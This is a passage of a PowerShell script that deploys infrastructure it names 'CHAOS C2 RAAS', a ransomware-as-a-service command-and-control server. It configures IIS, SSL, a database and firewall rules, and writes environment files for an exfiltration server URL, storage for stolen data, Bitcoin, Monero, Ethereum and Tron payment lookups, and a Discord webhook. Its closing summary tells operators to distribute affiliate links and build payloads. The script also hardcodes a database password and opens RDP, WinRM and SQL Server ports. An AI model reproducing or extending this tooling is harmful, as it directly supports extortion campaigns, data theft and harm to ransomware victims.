Add-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST/ChaosDashboard' -filter "system.webServer/rewrite/rules/rule[@name='Realtime Proxy']/action" -name 'type' -value 'Rewrite'
Add-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST/ChaosDashboard' -filter "system.webServer/rewrite/rules/rule[@name='Realtime Proxy']/action" -name 'url' -value 'http://localhost:3001/{R:1}'

Write-Success "IIS configured with URL Rewrite"

# =====================================================================
# PHASE 8: SSL/TLS
# =====================================================================
Write-Step "PHASE 8: SSL/TLS CONFIGURATION"

if ($Domain -and $Domain -ne "bytebane.duckdns.org" -and $Domain -notmatch "^\d+\.\d+\.\d+\.\d+$") {
    Write-Log "Requesting SSL certificates with Certbot..."
    certbot certonly --webroot -w "$ProjectRoot\wwwroot\dashboard" -d $Domain -d "www.$Domain" --email $Email --agree-tos --non-interactive --force-renewal
    
    if (Test-Path "C:\Certbot\live\$Domain\fullchain.pem") {
        $cert = Get-PfxCertificate -FilePath "C:\Certbot\live\$Domain\fullchain.pem"
        $thumbprint = $cert.Thumbprint
        
        netsh http add sslcert ipport=0.0.0.0:443 certhash=$thumbprint appid={$([guid]::NewGuid())} | Out-Null
        netsh http add sslcert ipport=0.0.0.0:8443 certhash=$thumbprint appid={$([guid]::NewGuid())} | Out-Null
        
        appcmd set site /site.name:"ChaosDashboard" /+bindings.[protocol='https',bindingInformation='*:443:'] | Out-Null
        appcmd set site /site.name:"ChaosAffiliate" /+bindings.[protocol='https',bindingInformation='*:8443:'] | Out-Null
        
        # HTTP to HTTPS redirect
        Import-Module WebAdministration
        Add-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST/ChaosDashboard' -filter 'system.webServer/rewrite/rules' -name '.' -value @{name='HTTP to HTTPS'; stopProcessing=$true} -ErrorAction SilentlyContinue
        Set-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST/ChaosDashboard' -filter "system.webServer/rewrite/rules/rule[@name='HTTP to HTTPS']/match" -name 'url' -value '(.*)'
        Add-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST/ChaosDashboard' -filter "system.webServer/rewrite/rules/rule[@name='HTTP to HTTPS']/conditions" -name '.' -value @{input='{HTTPS}'; pattern='^OFF$'}
        Add-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST/ChaosDashboard' -filter "system.webServer/rewrite/rules/rule[@name='HTTP to HTTPS']/action" -name 'type' -value 'Redirect'
        Add-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST/ChaosDashboard' -filter "system.webServer/rewrite/rules/rule[@name='HTTP to HTTPS']/action" -name 'url' -value 'https://{HTTP_HOST}/{R:1}'
        Add-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST/ChaosDashboard' -filter "system.webServer/rewrite/rules/rule[@name='HTTP to HTTPS']/action" -name 'redirectType' -value 'Permanent'
        
        Write-Success "SSL configured with auto-redirect"
    }
} else {
    Write-Warn "Using IP or DuckDNS - skipping custom SSL (Let's Encrypt works with DuckDNS automatically)"
}

# =====================================================================
# PHASE 9: ENVIRONMENT CONFIG
# =====================================================================
Write-Step "PHASE 9: ENVIRONMENT CONFIGURATION"

$apiEnv = @"
NODE_ENV=production
PORT=3000
DB_SERVER=localhost\CHAOS
DB_DATABASE=ChaosC2
DB_USER=chaos_app
DB_PASSWORD=ChaosApp_2024!SecurePass
DB_ENCRYPT=false
DB_TRUST_SERVER_CERTIFICATE=true
MASTER_API_KEY=$MasterApiKey
CAMPAIGN_ID=$CampaignId
CAMPAIGN_NAME=$CampaignName
EXFIL_SERVER_URL=https://$Domain
EXTERNAL_STORAGE_PROVIDER=r2
EXTERNAL_STORAGE_BUCKET=$R2BucketName
EXTERNAL_STORAGE_PUBLIC_URL=$R2PublicUrl
R2_ACCOUNT_ID=$R2AccountId
R2_ACCESS_KEY_ID=$R2AccessKeyId
R2_SECRET_ACCESS_KEY=$R2SecretAccessKey
BTC_API_URL=https://blockstream.info/api
XMR_API_URL=https://xmrchain.net/api
ETHERSCAN_API_URL=https://api.etherscan.io/api
ETHERSCAN_API_KEY=$EtherscanApiKey
TRONSCAN_API_URL=https://apilist.tronscan.org/api
DISCORD_WEBHOOK=$DiscordWebhook
"@

$affiliateEnv = @"
NODE_ENV=production
PORT=3002
NEXT_PUBLIC_API_URL=https://$Domain
NEXT_PUBLIC_APP_URL=https://$Domain
NEXT_PUBLIC_WS_URL=wss://$Domain
"@

$apiEnv | Set-Content "$ProjectRoot\wwwroot\api\.env" -Encoding UTF8
$affiliateEnv | Set-Content "$ProjectRoot\wwwroot\affiliate\.env" -Encoding UTF8
Write-Success "Environment files created"

# =====================================================================
# PHASE 10: FIREWALL & SECURITY
# =====================================================================
Write-Step "PHASE 10: FIREWALL & SECURITY"

netsh advfirewall set allprofiles state on | Out-Null

$ports = @(
    @{Name="Chaos HTTP"; Port=80; Proto="TCP"},
    @{Name="Chaos HTTPS"; Port=443; Proto="TCP"},
    @{Name="Chaos API"; Port=3000; Proto="TCP"},
    @{Name="Chaos Realtime"; Port=3001; Proto="TCP"},
    @{Name="Chaos Affiliate"; Port=3002; Proto="TCP"},
    @{Name="Chaos API HTTPS"; Port=8443; Proto="TCP"},
    @{Name="SQL Server"; Port=1433; Proto="TCP"},
    @{Name="RDP"; Port=3389; Proto="TCP"},
    @{Name="WinRM HTTP"; Port=5985; Proto="TCP"},
    @{Name="WinRM HTTPS"; Port=5986; Proto="TCP"}
)

foreach ($rule in $ports) {
    netsh advfirewall firewall add rule name=$rule.Name dir=in action=allow protocol=$rule.Proto localport=$rule.Port | Out-Null
}

Write-Success "Firewall configured"

# =====================================================================
# PHASE 11: START SERVICES & VERIFY
# =====================================================================
Write-Step "PHASE 11: START SERVICES & VERIFICATION"

net start w3svc 2>$null
net start MSSQL$CHAOS 2>$null
net start ChaosAPI 2>$null
net start ChaosRealtime 2>$null
net start ChaosAffiliate 2>$null

Start-Sleep -Seconds 10

# Verify
$checks = @(
    @{Url="http://localhost:80"; Name="Dashboard"},
    @{Url="http://localhost:8080"; Name="Affiliate"},
    @{Url="http://localhost:3000/api/health"; Name="API"},
    @{Url="http://localhost:3001"; Name="Realtime"}
)

$passed = 0
foreach ($check in $checks) {
    try {
        $resp = Invoke-WebRequest -Uri $check.Url -UseBasicParsing -TimeoutSec 5 -ErrorAction Stop
        if ($resp.StatusCode -eq 200) { Write-Success "$($check.Name): OK"; $passed++ }
        else { Write-Warn "$($check.Name): HTTP $($resp.StatusCode)" }
    } catch { Write-ErrorMsg "$($check.Name): FAILED" }
}

Write-Host "`nHealth checks: $passed/4 passed" -ForegroundColor $Colors.Cyan

# =====================================================================
# FINAL SUMMARY
# =====================================================================
Write-Step "DEPLOYMENT COMPLETE"

Write-Host @"
╔═══════════════════════════════════════════════════════════════════╗
║              CHAOS C2 RAAS - DEPLOYMENT COMPLETE                  ║
║              Azure VM: 40.90.228.120                               ║
╚═══════════════════════════════════════════════════════════════════╝

Server IP:     40.90.228.120
Dashboard:     http://$Domain (or http://40.90.228.120)
Affiliate:     http://affiliate.$Domain (or http://40.90.228.120:8080)
API:           http://40.90.228.120:3000/api/v2
Realtime:      http://40.90.228.120:3001

Master API Key: $MasterApiKey
Campaign ID:    $CampaignId
Campaign Name:  $CampaignName

Config saved to: $ProjectRoot\deploy.config.env
Credentials:     $ProjectRoot\DEPLOYMENT_CREDENTIALS.txt

Next steps:
1. Open http://$Domain in browser
2. Login with Master API Key
3. Create campaigns and distribute affiliate links
4. Build payloads with campaign API keys
5. Monitor at http://$Domain/dashboard

Logs:      $ProjectRoot\logs\
Backups:   $ProjectRoot\backups\
"@

# Save credentials
$credContent = @"
# Chaos C2 Deployment Credentials - $(Get-Date)
MASTER_API_KEY=$MasterApiKey
CAMPAIGN_ID=$CampaignId
CAMPAIGN_NAME=$CampaignName
DOMAIN=$Domain
DASHBOARD_URL=http://$Domain
AFFILIATE_URL=http://affiliate.$Domain
API_URL=http://40.90.228.120:3000/api/v2
REALTIME_URL=http://40.90.228.120:3001
MASTER_API_KEY=$MasterApiKey
CAMPAIGN_API_KEY= (create in dashboard)
VERCEL_TOKEN=$VercelToken
CF_TOKEN=$CfToken
CF_ZONE_ID=$CfZoneId
R2_ACCOUNT_ID=$R2AccountId
R2_ACCESS_KEY_ID=$R2AccessKeyId
R2_SECRET_ACCESS_KEY=$R2SecretAccessKey
R2_BUCKET_NAME=$R2BucketName
R2_PUBLIC_URL=$R2PublicUrl
DISCORD_WEBHOOK=$DiscordWebhook
ETHERSCAN_API_KEY=$EtherscanApiKey
SERVER_IP=40.90.228.120
SQL_INSTANCE=localhost\CHAOS
SQL_DB=ChaosC2
SQL_USER=chaos_app
SQL_PASS=ChaosApp_2024!SecurePass
"@

$credContent | Out-File -FilePath "$ProjectRoot\DEPLOYMENT_CREDENTIALS.txt" -Encoding UTF8
Write-Success "Credentials saved to DEPLOYMENT_CREDENTIALS.txt"
Write-Warn "SECURE THIS FILE - IT CONTAINS ALL ACCESS CREDENTIALS"

Write-Success "Deployment complete! 🎉"